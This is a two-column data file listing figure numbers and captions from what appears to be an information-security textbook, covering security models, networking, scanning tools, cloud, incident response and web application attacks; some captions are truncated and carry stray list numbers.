Code,Text
FIGURE 8.2,"The TCB, security perimeter, and reference monitor 3 ."
FIGURE 8.3,The take-grant model's directed graph 4 .
FIGURE 8.4,The Bell–LaPadula model 5 .
FIGURE 8.5,The Biba model 6 .
FIGURE 8.6,The Clark–Wilson model 8 . Chapter 9 1 .
FIGURE 9.1,The four-layer protection ring model 2 .
FIGURE 9.2,The life cycle of an executed process 3 .
FIGURE 9.3,Types of hypervisors 4 .
FIGURE 9.4,Application containers versus a hypervisor 9 . Chapter 10 1 .
FIGURE 10.1,A smartcard's ISO 7816 interface 2 .
FIGURE 10.2,Hot and cold aisles 3 .
FIGURE 10.3,The fire triangle 4 .
FIGURE 10.4,The four primary stages of fire 5 .
FIGURE 10.5,A secure physical boundary with a person trap and a turnstile 10 . Chapter 11 1 .
FIGURE 11.1,The OSI model 2 .
FIGURE 11.2,OSI model encapsulation 3 .
FIGURE 11.3,The OSI model peer layer logical channels 4 .
FIGURE 11.4,OSI model layer-based network container names 5 .
FIGURE 11.5,Comparing the OSI model with the TCP/IP model 6 .
FIGURE 11.6,The TCP three-way handshake 7 .
FIGURE 11.7,An RFID antenna 8 .
FIGURE 11.8,The configuration dialog boxes for a transparent (left) versus a... 9 .
FIGURE 11.9,A ring topology 10 .
FIGURE 11.10,A linear bus topology and a tree bus topology 11 .
FIGURE 11.11,A star topology 12 .
FIGURE 11.12,A mesh topology 11 . Chapter 12 1 .
FIGURE 12.1,IPSec's encryption of a packet in transport mode 2 .
FIGURE 12.2,IPSec's encryption of a packet in tunnel mode 3 .
FIGURE 12.3,Two LANs being connected using a tunnel-mode VPN across the Inte... 4 .
FIGURE 12.4,A client connecting to a network via a remote-access/tunnel VPN ... 12 . Chapter 13 1 .
FIGURE 13.1,Hardware authenticator 2 .
FIGURE 13.2,Software authenticator 3 .
FIGURE 13.3,Graph of FRR and FAR errors indicating the CER point 4 .
FIGURE 13.4,YubiKey passkey 13 . Chapter 14 1 .
FIGURE 14.1,Role-based access control 2 .
FIGURE 14.2,A representation of the boundaries provided by lattice-based acc... 3 .
FIGURE 14.3,NIST Zero-Trust core trust logical components 4 .
FIGURE 14.4,Wireshark capture 14 . Chapter 15 1 .
FIGURE 15.1,Nmap scan of a web server run from a Linux system 2 .
FIGURE 15.2,Default Apache server page running on the server scanned in Figu... 3 .
FIGURE 15.3,Nmap scan of a large network run from a Mac system using the Ter... 4 .
FIGURE 15.4,Network vulnerability scan of the same web server that was port ... 5 .
FIGURE 15.5,Web application vulnerability scan of the same web server that w... 6 .
FIGURE 15.6,Scanning a database-backed application with Sqlmap 7 .
FIGURE 15.7,Penetration testing process 8 .
FIGURE 15.8,The Metasploit Framework automated system exploitation tool allo... 9 .
FIGURE 15.9,"Fagan inspections follow a rigid formal process, with defined en... 10 ."
FIGURE 15.10,Prefuzzing input file containing a series of 1s 11 .
FIGURE 15.11,The input file from Figure 15.10 after being run through the zz... 15 . Chapter 16 1 .
FIGURE 16.1,Cloud shared responsibility model 2 .
FIGURE 16.2,Creating and deploying images 3 .
FIGURE 16.3,Web server and database server 16 . Chapter 17 1 .
FIGURE 17.1,Incident management 2 .
FIGURE 17.2,SYN flood attack 3 .
FIGURE 17.3,A man-in-the-middle attack 4 .
FIGURE 17.4,Intrusion prevention system 5 .
FIGURE 17.5,Viewing a log entry 17 . Chapter 18 1 .
FIGURE 18.1,Seismic hazard map 2 .
FIGURE 18.2,"Flood hazard map for Miami–Dade County, Florida 3 ."
FIGURE 18.3,Failover cluster with network load balancing 18 . Chapter 20 1 .
FIGURE 20.1,RStudio Desktop IDE 2 .
FIGURE 20.2,Security vs. user-friendliness vs. functionality 3 .
FIGURE 20.3,The iterative life cycle model with feedback loop 8/442 4 .
FIGURE 20.4,The spiral life cycle mode 5 .
FIGURE 20.5,Software Assurance Maturity Model 6 .
FIGURE 20.6,The IDEAL model 7 .
FIGURE 20.7,Gantt chart 8 .
FIGURE 20.8,The DevOps model 9 .
FIGURE 20.9,Hierarchical data model 10 .
FIGURE 20.10,Customers table from a relational database 11 .
FIGURE 20.11,ODBC as the interface between applications and a backend databa... 19 . Chapter 21 1 .
FIGURE 21.1,Account number input page 2 .
FIGURE 21.2,Account information page 3 .
FIGURE 21.3,Account information page after blind SQL injection 4 .
FIGURE 21.4,Account creation page 5 .
FIGURE 21.5,Example web server directory structure 6 .
FIGURE 21.6,Message board post rendered in a browser 7 .
FIGURE 21.7,XSS attack rendered in a browser 8 .
FIGURE 21.8,Web application firewall 9 .
